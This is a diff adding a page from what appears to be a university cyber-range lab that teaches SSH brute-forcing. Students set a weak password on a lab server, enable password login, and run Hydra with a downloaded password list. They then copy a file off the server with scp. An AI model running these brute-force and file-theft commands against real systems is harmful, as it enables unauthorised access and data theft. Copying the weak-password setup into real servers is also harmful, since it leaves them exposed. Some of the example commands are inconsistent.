@@ -1,0 +1,93 @@
+<div class="step-detail-title"> Step 3 - Launch attack </div>
+
+<div class="options list-group">
+    <a href="javascript:showStep('lab_step_3_0')" class="list-group-item list-group-item-success ">Create user on Server 2 </a>
+    <div class="lab-step-details" style="" id="lab_step_3_0">
+        <p>Login to Server2 Console via SSH using the GENI interface.
+            <br/>We will need to create a ubuntu user on server2 with the password password1. To create the ubuntu user, execute the following command:
+        </p>
+        <div class="lab-code">
+            <p>sudo useradd --create-home ubuntu </p>
+
+        </div>
+        <br/>
+        <p>Now, we need to set a password for the ubuntu user. Execute the following command to set the password for the ubuntu user, and enter the password password1:</p>
+        <div class="lab-code">
+            <p>sudo passwd ubuntu </p>
+
+        </div>
+        <p>You willl be prompted to retype the password again, and once you have entered it twice, you will receive the response passwd: all authentication tokens updated successfully. Go on to the next step to enable password authentication.</p>
+        <br/>
+        <p>To enable password authentication, execute the following command on server for ubuntu user:</p>
+        <div class="lab-code">
+            <p>sudo sed -i "s/.*PasswordAuthentication.*/PasswordAuthentication yes/g" /etc/ssh/sshd_config
+            </p>
+
+        </div>
+        <p>Note: I know that this will replace ALL instances of PasswordAuthentication, including the ones in comments, but fortunately multiple instances of PasswordAuthentication yes in the file won't cause an issue, and this is the cleanest way to do it without vim, so I recommend this method)</p>
+
+        <p>
+            After enabling password authentication, we are going to want to restart the ssh service so that the changes can take effect. Execute the following command to restart the ssh service
+        </p>
+        <div class="lab-code">
+            <p> sudo service sshd restart</p>
+        </div>
+
+        <br/>
+        <div class="lab-code">
+            <p>su ubuntu </p>
+            <p> cd ~</p>
+            <p> wget http://download.blender.org/peach/bigbuckbunny_movies/BigBuckBunny_640x360.m4v
+            </p>
+        </div>
+
+    </div>
+
+    <a href="javascript:showStep('lab_step_3_1')" class="list-group-item list-group-item-success ">Launch the attack using Hydra </a>
+    <div class="lab-step-details" style="display: none;" id="lab_step_3_1">
+        <p>Login to Attacker2 Console via SSH using the GENI interface.
+            <br/>Download a password list by executing the following command.
+        </p>
+        <div class="lab-code">
+            <p>wget http://zeldor.biz/other/bruteforce/passlist.txt </p>
+
+        </div>
+
+        <br>
+
+        <p>
+            With Hydra and the password list downloaded, navigate to the directory containing the password list and execute the following command, replacing $ip_addr with the IP address of the server that will be attacked. If the server is using a port other than 22, execute the second command, replacing both $ip_addr and $port with the IP address and the port of the server respectively.
+        </p>
+
+        <div class="lab-code">
+            <p>hydra -l ubuntu -P passlist.txt $ip_addr ssh </p>
+        </div>
+        <p><b>example : </b><i>hydra -s $port -l ubuntu -P passlist.txt $ip_addr ssh</i></p>
+        <div class="lab-code">
+            <p>hydra -s $port -l ubuntu -P passlist.txt $ip_addr ssh </p>
+        </div>
+        <p><b>example : </b><i>hydra -s 25412 -l ubuntu -P passlist.txt pc2.lan.sdn.uky.edu ssh</i></p>
+        <p>You host name should be something like below but it should be your server name.</p>
+        <img style="width:50%;" src="/MizzouCyberRange/img/lab2/3_1.png" alt="" />
+        <p>The above step will take some time to execute, but after a bit it should produce a message like this one</p>
+        <img style="width:70%;" src="/MizzouCyberRange/img/lab2/3_2.png" alt="" />
+        <br/><br/>
+        <p>As you can see, the password has been identified as password1, and can be used to log in to server2.</p>
+        
+
+        <p>Now that you have obtained the server's password, we are going to steal a file from the server.
+            <br/> Execute the following command to attempt to steal the file from the victim, replacing $ipAddress with the IP address of the victim. When prompted, enter the password that Hydra obtained for you (password1)
+        </p>
+        <div class="lab-code">
+
+            <p> scp ubuntu@$ipAddress:~/Big* </p>
+        </div>
+		
+		<p><b>example : </b><i>scp ubuntu@10.0.0.103:~/back* .</i></p>
+        
+			
+        <br/>
+        <p>The file should now be copied over to the attacking server. Execute the ls command to list the current directory and ensure that the file BigBuckBunny_640x360.m4v is present. If so, you have successfully performed the attack and stolen the file</p>
+    </div>
+
+</div>
